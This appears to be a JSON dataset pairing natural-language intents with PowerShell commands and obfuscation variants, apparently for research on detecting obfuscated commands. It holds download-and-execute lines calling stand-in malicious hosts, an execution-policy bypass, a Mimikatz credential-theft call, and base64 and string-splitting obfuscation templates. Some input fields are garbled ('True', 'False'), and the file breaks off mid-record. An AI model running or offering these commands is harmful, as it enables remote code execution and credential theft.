[
  {
    "input": "Execute PowerShell code retrieved from a remote URL.",
    "output": "Invoke-Expression (Invoke-WebRequest -Url 'http://exploiting-site.com/sospiciousFile.ps1'.Content)",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Execute PowerShell code retrieved from a remote URL.",
    "origin_cmd": "Invoke-Expression (Invoke-WebRequest -Url 'http://exploiting-site.com/sospiciousFile.ps1'.Content)"
  },
  {
    "input": "Execute PowerShell code retrieved from a remote URL.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute PowerShell code retrieved from a remote URL.",
    "origin_cmd": "Invoke-Expression (Invoke-WebRequest -Url 'http://exploiting-site.com/sospiciousFile.ps1'.Content)"
  },
  {
    "input": "Execute PowerShell code retrieved from a remote URL .",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute PowerShell code retrieved from a remote URL.",
    "origin_cmd": "Invoke-Expression (Invoke-WebRequest -Url 'http://exploiting-site.com/sospiciousFile.ps1'.Content)"
  },
  {
    "input": "Execute PowerShell code retrieved from a remote URL.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute PowerShell code retrieved from a remote URL.",
    "origin_cmd": "Invoke-Expression (Invoke-WebRequest -Url 'http://exploiting-site.com/sospiciousFile.ps1'.Content)"
  },
  {
    "input": "Execute PowerShell code retrieved from a remote URL.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute PowerShell code retrieved from a remote URL.",
    "origin_cmd": "Invoke-Expression (Invoke-WebRequest -Url 'http://exploiting-site.com/sospiciousFile.ps1'.Content)"
  },
  {
    "input": "Execute PowerShell code retrieved from a remote URL.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute PowerShell code retrieved from a remote URL.",
    "origin_cmd": "Invoke-Expression (Invoke-WebRequest -Url 'http://exploiting-site.com/sospiciousFile.ps1'.Content)"
  },
  {
    "input": "Execute PowerShell code retrieved from a remote URL .",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute PowerShell code retrieved from a remote URL.",
    "origin_cmd": "Invoke-Expression (Invoke-WebRequest -Url 'http://exploiting-site.com/sospiciousFile.ps1'.Content)"
  },
  {
    "input": "Execute PowerShell code retrieved from a remote URL.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute PowerShell code retrieved from a remote URL.",
    "origin_cmd": "Invoke-Expression (Invoke-WebRequest -Url 'http://exploiting-site.com/sospiciousFile.ps1'.Content)"
  },
  {
    "input": "Execute PowerShell code retrieved from a remote URL.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute PowerShell code retrieved from a remote URL.",
    "origin_cmd": "Invoke-Expression (Invoke-WebRequest -Url 'http://exploiting-site.com/sospiciousFile.ps1'.Content)"
  },
  {
    "input": "Execute PowerShell code retrieved from a remote URL.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute PowerShell code retrieved from a remote URL.",
    "origin_cmd": "Invoke-Expression (Invoke-WebRequest -Url 'http://exploiting-site.com/sospiciousFile.ps1'.Content)"
  },
  {
    "input": "Execute PowerShell code retrieved from a remote URL .",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute PowerShell code retrieved from a remote URL.",
    "origin_cmd": "Invoke-Expression (Invoke-WebRequest -Url 'http://exploiting-site.com/sospiciousFile.ps1'.Content)"
  },
  {
    "input": "Execute PowerShell code retrieved from a remote URL.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute PowerShell code retrieved from a remote URL.",
    "origin_cmd": "Invoke-Expression (Invoke-WebRequest -Url 'http://exploiting-site.com/sospiciousFile.ps1'.Content)"
  },
  {
    "input": "Execute PowerShell code retrieved from a remote URL.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute PowerShell code retrieved from a remote URL.",
    "origin_cmd": "Invoke-Expression (Invoke-WebRequest -Url 'http://exploiting-site.com/sospiciousFile.ps1'.Content)"
  },
  {
    "input": "Execute PowerShell code retrieved from a remote URL.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute PowerShell code retrieved from a remote URL.",
    "origin_cmd": "Invoke-Expression (Invoke-WebRequest -Url 'http://exploiting-site.com/sospiciousFile.ps1'.Content)"
  },
  {
    "input": "Execute PowerShell code retrieved from a remote URL .",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute PowerShell code retrieved from a remote URL.",
    "origin_cmd": "Invoke-Expression (Invoke-WebRequest -Url 'http://exploiting-site.com/sospiciousFile.ps1'.Content)"
  },
  {
    "input": "Execute PowerShell code retrieved from a remote URL.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute PowerShell code retrieved from a remote URL.",
    "origin_cmd": "Invoke-Expression (Invoke-WebRequest -Url 'http://exploiting-site.com/sospiciousFile.ps1'.Content)"
  },
  {
    "input": "Download and execute a PowerShell script from a malicious URL.",
    "output": "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciousscript.ps1'))\";",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Download and execute a PowerShell script from a malicious URL.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciousscript.ps1'))\";"
  },
  {
    "input": ": Download and execute a PowerShell script from a malicious URL.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a malicious URL.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciousscript.ps1'))\";"
  },
  {
    "input": ": Free PowerShell script from malicious URLs! This is my: Download and execute a PowerShell script from a malicious URL.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a malicious URL.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciousscript.ps1'))\";"
  },
  {
    "input": "Download and execute a PowerShell script from a malicious URL.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a malicious URL.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciousscript.ps1'))\";"
  },
  {
    "input": "Download and execute a PowerShell script from a malicious URL.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a malicious URL.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciousscript.ps1'))\";"
  },
  {
    "input": ": Download and execute a PowerShell script from a malicious URL.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a malicious URL.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciousscript.ps1'))\";"
  },
  {
    "input": ": Free PowerShell script from malicious URLs! This is my: Download and execute a PowerShell script from a malicious URL.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a malicious URL.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciousscript.ps1'))\";"
  },
  {
    "input": "Download and execute a PowerShell script from a malicious URL.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a malicious URL.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciousscript.ps1'))\";"
  },
  {
    "input": "Download and execute a PowerShell script from a malicious URL.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a malicious URL.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciousscript.ps1'))\";"
  },
  {
    "input": ": Download and execute a PowerShell script from a malicious URL.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a malicious URL.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciousscript.ps1'))\";"
  },
  {
    "input": ": Free PowerShell script from malicious URLs! This is my: Download and execute a PowerShell script from a malicious URL.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a malicious URL.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciousscript.ps1'))\";"
  },
  {
    "input": "Download and execute a PowerShell script from a malicious URL.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a malicious URL.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciousscript.ps1'))\";"
  },
  {
    "input": "Download and execute a PowerShell script from a malicious URL.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a malicious URL.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciousscript.ps1'))\";"
  },
  {
    "input": ": Download and execute a PowerShell script from a malicious URL.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a malicious URL.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciousscript.ps1'))\";"
  },
  {
    "input": ": Free PowerShell script from malicious URLs! This is my: Download and execute a PowerShell script from a malicious URL.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a malicious URL.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciousscript.ps1'))\";"
  },
  {
    "input": "Download and execute a PowerShell script from a malicious URL.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a malicious URL.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciousscript.ps1'))\";"
  },
  {
    "input": "Retrieve local group information and its members for the \"Administrators\" group.",
    "output": "get-localgroup ; Get-LocalGroupMember -Name \"Administrators\"",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Retrieve local group information and its members for the \"Administrators\" group.",
    "origin_cmd": "get-localgroup ; Get-LocalGroupMember -Name \"Administrators\""
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve local group information and its members for the \"Administrators\" group.",
    "origin_cmd": "get-localgroup ; Get-LocalGroupMember -Name \"Administrators\""
  },
  {
    "input": "Retrieve local group information and its members for the \"Administrators\" group.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieve local group information and its members for the \"Administrators\" group.",
    "origin_cmd": "get-localgroup ; Get-LocalGroupMember -Name \"Administrators\""
  },
  {
    "input": "False",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve local group information and its members for the \"Administrators\" group.",
    "origin_cmd": "get-localgroup ; Get-LocalGroupMember -Name \"Administrators\""
  },
  {
    "input": "Retrieve local group information and its members for the \"Administrators\" group.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieve local group information and its members for the \"Administrators\" group.",
    "origin_cmd": "get-localgroup ; Get-LocalGroupMember -Name \"Administrators\""
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve local group information and its members for the \"Administrators\" group.",
    "origin_cmd": "get-localgroup ; Get-LocalGroupMember -Name \"Administrators\""
  },
  {
    "input": "Retrieve local group information and its members for the \"Administrators\" group.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieve local group information and its members for the \"Administrators\" group.",
    "origin_cmd": "get-localgroup ; Get-LocalGroupMember -Name \"Administrators\""
  },
  {
    "input": "False",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve local group information and its members for the \"Administrators\" group.",
    "origin_cmd": "get-localgroup ; Get-LocalGroupMember -Name \"Administrators\""
  },
  {
    "input": "Retrieve local group information and its members for the \"Administrators\" group.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieve local group information and its members for the \"Administrators\" group.",
    "origin_cmd": "get-localgroup ; Get-LocalGroupMember -Name \"Administrators\""
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve local group information and its members for the \"Administrators\" group.",
    "origin_cmd": "get-localgroup ; Get-LocalGroupMember -Name \"Administrators\""
  },
  {
    "input": "Retrieve local group information and its members for the \"Administrators\" group.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve local group information and its members for the \"Administrators\" group.",
    "origin_cmd": "get-localgroup ; Get-LocalGroupMember -Name \"Administrators\""
  },
  {
    "input": "False",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve local group information and its members for the \"Administrators\" group.",
    "origin_cmd": "get-localgroup ; Get-LocalGroupMember -Name \"Administrators\""
  },
  {
    "input": "Retrieve local group information and its members for the \"Administrators\" group.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve local group information and its members for the \"Administrators\" group.",
    "origin_cmd": "get-localgroup ; Get-LocalGroupMember -Name \"Administrators\""
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve local group information and its members for the \"Administrators\" group.",
    "origin_cmd": "get-localgroup ; Get-LocalGroupMember -Name \"Administrators\""
  },
  {
    "input": "Retrieve local group information and its members for the \"Administrators\" group.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve local group information and its members for the \"Administrators\" group.",
    "origin_cmd": "get-localgroup ; Get-LocalGroupMember -Name \"Administrators\""
  },
  {
    "input": "False",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve local group information and its members for the \"Administrators\" group.",
    "origin_cmd": "get-localgroup ; Get-LocalGroupMember -Name \"Administrators\""
  },
  {
    "input": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "output": "powershell.exe -Command \"Invoke-Mimikatz\"",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Mimikatz\""
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Mimikatz\""
  },
  {
    "input": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Mimikatz\""
  },
  {
    "input": "True",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Mimikatz\""
  },
  {
    "input": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Mimikatz\""
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Mimikatz\""
  },
  {
    "input": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Mimikatz\""
  },
  {
    "input": "True",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Mimikatz\""
  },
  {
    "input": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Mimikatz\""
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Mimikatz\""
  },
  {
    "input": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Mimikatz\""
  },
  {
    "input": "True",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Mimikatz\""
  },
  {
    "input": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Mimikatz\""
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Mimikatz\""
  },
  {
    "input": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Mimikatz\""
  },
  {
    "input": "True",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute Mimikatz tool in PowerShell to extract credentials.",
    "origin_cmd": "powershell.exe -Command \"Invoke-Mimikatz\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "output": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.it/exWin64.ps1')\"",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "origin_cmd": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.it/exWin64.ps1')\""
  },
  {
    "input": ": Read for yourself: Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "origin_cmd": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.it/exWin64.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "origin_cmd": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.it/exWin64.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script with bypassing script execution policy.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "origin_cmd": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.it/exWin64.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "origin_cmd": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.it/exWin64.ps1')\""
  },
  {
    "input": ": Read for yourself: Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "origin_cmd": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.it/exWin64.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "origin_cmd": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.it/exWin64.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script with bypassing script execution policy.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "origin_cmd": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.it/exWin64.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "origin_cmd": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.it/exWin64.ps1')\""
  },
  {
    "input": ": Read for yourself: Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "origin_cmd": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.it/exWin64.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "origin_cmd": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.it/exWin64.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script with bypassing script execution policy.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "origin_cmd": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.it/exWin64.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "origin_cmd": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.it/exWin64.ps1')\""
  },
  {
    "input": ": Read for yourself: Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "origin_cmd": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.it/exWin64.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing script execution policy.",
    "origin_cmd": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.it/exWin64.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script with bypassing script execution policy.",
